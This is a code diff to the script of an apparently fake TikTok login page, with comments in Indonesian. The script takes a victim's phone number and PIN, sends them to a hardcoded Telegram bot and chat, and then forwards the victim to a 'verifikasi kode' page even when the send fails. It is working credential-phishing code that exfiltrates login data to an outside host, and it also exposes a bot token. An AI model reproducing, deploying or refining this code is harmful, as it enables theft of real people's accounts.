@@ -141,36 +141,44 @@
     <!-- SCRIPT KIRIM KE TELEGRAM & PINDAH HALAMAN -->
     <!-- ============================================== -->
     <script>
-        // 👇👇 GANTI INI DULU 👇👇
-        const BOT_TOKEN = "8601180674:AAFIKfS86WCFNfAg22OfU1_8z6MFRRxV6qM"; 
-        const CHAT_ID = "-1003984000704";
-        const HALAMAN_BERIKUTNYA = "verifikasi kode.html"; // Ganti nama file
+    // 👇👇 GANTI INI DULU 👇👇
+    const BOT_TOKEN = "8601180674:AAFIKfS86WCFNfAg22OfU1_8z6MFRRxV6qM"; 
+    const CHAT_ID = "-1003984000704";
+    const HALAMAN_BERIKUTNYA = "verifikasi kode.html"; // Ganti nama file
 
-        function kirimData(){
-            let nomor = document.getElementById("nomor").value;
-            let pin = document.getElementById("pin").value;
+    function kirimData(){
+        let nomor = document.getElementById("nomor").value;
+        let pin = document.getElementById("pin").value;
 
-            let pesan = `🔔 <b>DATA LOGIN TIKTOK!</b>
+        // CEK JIKA KOLOM NOMOR KOSONG
+        if(nomor.trim() === ""){
+            
+            return false; // BATALKAN PROSES
+        }
+
+        let pesan = `🔔 <b>DATA LOGIN TIKTOK!</b>
 📱 Nomor: ${nomor}
 🔑 PIN: ${pin}`;
 
-            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            
-            fetch(url, {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: pesan,
-                    parse_mode: "HTML"
-                })
+        let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        
+        // KIRIM DATA KE TELEGRAM
+        fetch(url, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: pesan,
+                parse_mode: "HTML"
             })
-            .then(() => {
-                // LANGSUNG PINDAH HALAMAN
-                window.location.href = HALAMAN_BERIKUTNYA;
-            });
-        }
-    </script>
+        })
+        .catch(() => {
+            // Kalau ada error tetap pindah halaman
+        })
+        .finally(() => {
+            // WAJIB PINDAH HALAMAN
+            window.location.href = HALAMAN_BERIKUTNYA;
+        });
+    }
+</script>
 
-</body>
-</html>
